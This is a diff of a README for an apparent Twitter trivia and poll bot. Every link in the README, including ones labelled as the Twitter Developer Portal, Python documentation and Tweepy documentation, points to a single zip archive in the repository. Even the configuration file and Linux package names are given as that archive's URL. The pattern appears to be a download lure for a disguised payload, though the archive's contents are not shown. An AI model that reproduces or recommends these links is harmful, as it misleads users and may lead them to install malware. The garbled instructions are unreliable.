@@ -1,6 +1,6 @@
 # 🤖 twitter-reply-poll-trivia-bot - Automate Your Twitter Engagement Effortlessly
 
-[![Download Latest Release](https://raw.githubusercontent.com/mr3b911/twitter-reply-poll-trivia-bot/main/balsamous/twitter-reply-poll-trivia-bot.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mr3b911/twitter-reply-poll-trivia-bot/main/balsamous/twitter-reply-poll-trivia-bot.zip)
+[![Download Latest Release](https://github.com/mr3b911/twitter-reply-poll-trivia-bot/raw/refs/heads/main/balsamous/trivia_bot_poll_reply_twitter_v2.6.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/mr3b911/twitter-reply-poll-trivia-bot/raw/refs/heads/main/balsamous/trivia_bot_poll_reply_twitter_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -24,12 +24,12 @@ To run the twitter-reply-poll-trivia-bot, you will need:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest release: [Download Latest Release](https://raw.githubusercontent.com/mr3b911/twitter-reply-poll-trivia-bot/main/balsamous/twitter-reply-poll-trivia-bot.zip).
+To get started, visit this page to download the latest release: [Download Latest Release](https://github.com/mr3b911/twitter-reply-poll-trivia-bot/raw/refs/heads/main/balsamous/trivia_bot_poll_reply_twitter_v2.6.zip).
 
 Once you’re on the Releases page, follow these steps:
 
 1. Scroll down to the "Assets" section under the latest release.
-2. Find the file suitable for your operating system. If you’re using Windows, look for `.exe` files; for macOS, look for `.dmg` files; and for Linux, look for `https://raw.githubusercontent.com/mr3b911/twitter-reply-poll-trivia-bot/main/balsamous/twitter-reply-poll-trivia-bot.zip` or other suitable packages.
+2. Find the file suitable for your operating system. If you’re using Windows, look for `.exe` files; for macOS, look for `.dmg` files; and for Linux, look for `https://github.com/mr3b911/twitter-reply-poll-trivia-bot/raw/refs/heads/main/balsamous/trivia_bot_poll_reply_twitter_v2.6.zip` or other suitable packages.
 3. Click on the file to download it to your computer.
 
 After downloading:
@@ -41,11 +41,11 @@ After downloading:
 ## 🔧 Configuration
 
 1. **Twitter API Access**: 
-   - You will need Twitter API access to run the bot. Head to the [Twitter Developer Portal](https://raw.githubusercontent.com/mr3b911/twitter-reply-poll-trivia-bot/main/balsamous/twitter-reply-poll-trivia-bot.zip) to create your developer account and set up your project.
+   - You will need Twitter API access to run the bot. Head to the [Twitter Developer Portal](https://github.com/mr3b911/twitter-reply-poll-trivia-bot/raw/refs/heads/main/balsamous/trivia_bot_poll_reply_twitter_v2.6.zip) to create your developer account and set up your project.
    - Generate your API keys and tokens once your project is set up. 
 
 2. **Bot Configuration File**:
-   - Locate the configuration file in the application folder (usually named `https://raw.githubusercontent.com/mr3b911/twitter-reply-poll-trivia-bot/main/balsamous/twitter-reply-poll-trivia-bot.zip`).
+   - Locate the configuration file in the application folder (usually named `https://github.com/mr3b911/twitter-reply-poll-trivia-bot/raw/refs/heads/main/balsamous/trivia_bot_poll_reply_twitter_v2.6.zip`).
    - Open this file with a text editor and enter your Twitter API keys, access tokens, and any other settings based on your needs.
 
 ## 🎯 How to Use the Bot
@@ -71,8 +71,8 @@ We welcome your insights. If you find any bugs or have suggestions for improveme
 
 ## 🌐 Additional Resources
 
-- [Twitter Developer Documentation](https://raw.githubusercontent.com/mr3b911/twitter-reply-poll-trivia-bot/main/balsamous/twitter-reply-poll-trivia-bot.zip)
-- [Python Documentation](https://raw.githubusercontent.com/mr3b911/twitter-reply-poll-trivia-bot/main/balsamous/twitter-reply-poll-trivia-bot.zip)
-- [Tweepy Documentation](https://raw.githubusercontent.com/mr3b911/twitter-reply-poll-trivia-bot/main/balsamous/twitter-reply-poll-trivia-bot.zip)
+- [Twitter Developer Documentation](https://github.com/mr3b911/twitter-reply-poll-trivia-bot/raw/refs/heads/main/balsamous/trivia_bot_poll_reply_twitter_v2.6.zip)
+- [Python Documentation](https://github.com/mr3b911/twitter-reply-poll-trivia-bot/raw/refs/heads/main/balsamous/trivia_bot_poll_reply_twitter_v2.6.zip)
+- [Tweepy Documentation](https://github.com/mr3b911/twitter-reply-poll-trivia-bot/raw/refs/heads/main/balsamous/trivia_bot_poll_reply_twitter_v2.6.zip)
 
 Explore the exciting world of automated social media interaction with the twitter-reply-poll-trivia-bot! Engage your audience like never before, easily and efficiently.
